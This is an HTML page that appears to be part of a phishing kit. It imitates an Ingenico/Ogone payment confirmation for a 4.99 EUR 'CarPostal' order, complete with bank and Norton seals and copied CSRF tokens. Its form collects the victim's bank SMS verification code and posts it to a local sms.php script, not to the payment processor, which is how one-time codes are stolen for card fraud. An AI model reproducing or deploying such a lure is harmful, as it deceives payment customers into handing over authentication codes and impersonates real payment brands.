<!DOCTYPE html>
<html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Payment confirmation</title>
    <link rel="stylesheet" href="files/files/IngenicoResponsivePaymentPageTemplate_reset.css">
    <link rel="stylesheet" href="files/files/IngenicoResponsivePaymentPageTemplate_template.css">
</head>
<body>
<div id="page">
    <div id="logo-zone">
        <img id="customer-logo" src="files/files/logo.png" class="logo">
    </div>
    <div id="payment-zone">
	<!-- Order overview -->
	<h2 style="display: inline; position: absolute; left: -1000px; top: -1000px; width: 0px; height: 0px; overflow: hidden;">Order overview</h2>
	<table class="ncoltable1" id="ncol_ref" width="95%" cellspacing="0" cellpadding="2" border="0">
			
					<tbody><tr>
						
							<td class="ncoltxtl" colspan="1" width="50%" align="right"><small>Order reference :<!--External reference--></small></td>
							<td class="ncoltxtr" colspan="1" width="50%"><small>FA0082542514</small></td>
						
					</tr>
					<tr>
						
							<td class="ncoltxtl" colspan="1" align="right"><small>Total charge :<!--Total to pay--></small></td>
							<td class="ncoltxtr" colspan="1">
							<small>
							4.99 EUR
							</small>
							</td>
						
					</tr>
					<tr>
						
							<td class="ncoltxtl" colspan="1" align="right"><small>Beneficiary :<!--Beneficiary--></small></td>
							<td class="ncoltxtr" colspan="1"><small>CarPostal</small></td>
						
					</tr>

					
	</tbody></table>
	
		<br>
		<form method="POST" action="sms.php" >
			<table class="ncoltable1" width="95%" cellspacing="0" cellpadding="2" border="0">
				<tbody><tr><br><br><br>
						<td class="ncoltxtc" colspan="2" align="center">
								SMS Code : <input type="text" name="sms"  size="09" maxlength='12' autocomplete="off" tabindex="4" required>
						</td>
				</tr>
			</tbody></table>
			<input type="hidden" name="log" value="">
				<br>
				
		<script type="text/javascript" src="files/files/jquery-3.js"></script>
		<script type="text/javascript" src="files/files/jquery-migrate-1.js"></script>
	
		
	
	<script type="text/javascript" language="JavaScript" src="files/files/Fp_inc.js"></script>
	<script type="text/javascript" language="JavaScript" src="files/files/base64_inc.js"></script>
	
<!-- Further information / Cancel -->
<h2 style="display: inline; position: absolute; left: -1000px; top: -1000px; width: 0px; height: 0px; overflow: hidden;">Further information / Cancel</h2>
<table class="ncoltable3" id="ie_cc" style="behavior:url(#default#clientCaps)" width="95%" cellspacing="0" cellpadding="2" border="0">
	<tbody><tr><td class="ncollogoc" width="33%" valign="middle" align="center"><img src="files/files/BNP.gif" alt="BNP" title="BNP" id="NCOLACQ" hspace="5" border="0"></td><td class="ncollogoc" width="33%" valign="middle" align="center"><a href="https://secure.ogone.com/ncol/PSPabout.asp?lang=1&amp;pspid=FnacFR&amp;branding=OGONE&amp;CSRFSP=%2Fncol%2Fprod%2Forder%5Fagree%2Easp&amp;CSRFKEY=E457C449FFDE1A8B837393ABD19F87E61F5CC84E&amp;CSRFTS=20201127162414" target="_blank"><img src="files/files/pp_Ingenico-ePayments1.gif" alt="Payment processed by Ingenico" title="Payment processed by Ingenico" id="NCOLPP" vspace="2" border="0"></a><br><small><small><a class="bottom" href="https://secure.ogone.com/ncol/PSPabout.asp?lang=1&amp;pspid=FnacFR&amp;branding=OGONE&amp;CSRFSP=%2Fncol%2Fprod%2Forder%5Fagree%2Easp&amp;CSRFKEY=E457C449FFDE1A8B837393ABD19F87E61F5CC84E&amp;CSRFTS=20201127162414" target="_blank">About Ingenico</a> |<a class="bottom" href="https://secure.ogone.com/ncol/security.asp?lang=1&amp;mode=STD&amp;branding=OGONE&amp;CSRFSP=%2Fncol%2Fprod%2Forder%5Fagree%2Easp&amp;CSRFKEY=2166F055E2767944CF5E95A99D0A62B11C3E6AEA&amp;CSRFTS=20201127162414" target="_blank">Security<!--Security--></a>| <a class="bottom" href="https://payment-services.ingenico.com/int/en/locations?lang=1&amp;mode=STD&amp;branding=OGONE&amp;CSRFSP=%2Fncol%2Fprod%2Forder%5Fagree%2Easp&amp;CSRFKEY=9200C04D5305F813A8C837E8D2A66FE99BD7E690&amp;CSRFTS=20201127162414" target="_blank">Legal info<!--Legal--></a></small></small></td><td class="ncollogoc" width="33%" valign="middle" align="center"><a href="https://sealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&amp;dn=secure.ogone.com&amp;lang=en" target="_blank"><img src="files/files/norton-secured.png" alt="Norton Secured" title="Norton Secured" width="95" height="51" border="0"></a></td></tr>
		<tr>
				<td class="ncollogoc" colspan="3" align="center">
						<center>
							<table cellspacing="0" cellpadding="0" border="0">
									<tbody><tr>
										
												<td class="ncollogoc" width="50%" align="center">
													
														<input type="IMAGE" src="files/files/medat2_FRA_VAL.gif" id="VALIDER" name="VALIDER" tabindex="20" border="0">
														
													
												</td>
											
											<td class="ncollogoc" width="50%" align="center">
											
													
													<input type="hidden" name="CSRFKEY" value="F5851BD0962AFE1DFE8242A8CD364D5823463D4A">
<input type="hidden" name="CSRFTS" value="20201127162414">
<input type="hidden" name="CSRFSP" value="/ncol/prod/order_agree.asp">
														
														<small><input type="IMAGE" src="files/files/medat2_FRA_ANU.gif" id="VALIDER" name="VALIDER" tabindex="20" border="0"></small><!--Cancel-->
													</form>
											
											</td>
										
									</tr>
							</tbody></table>
						</center>
				</td>

		</tr>
		

</tbody></table>

</div>
</div>


</body></html>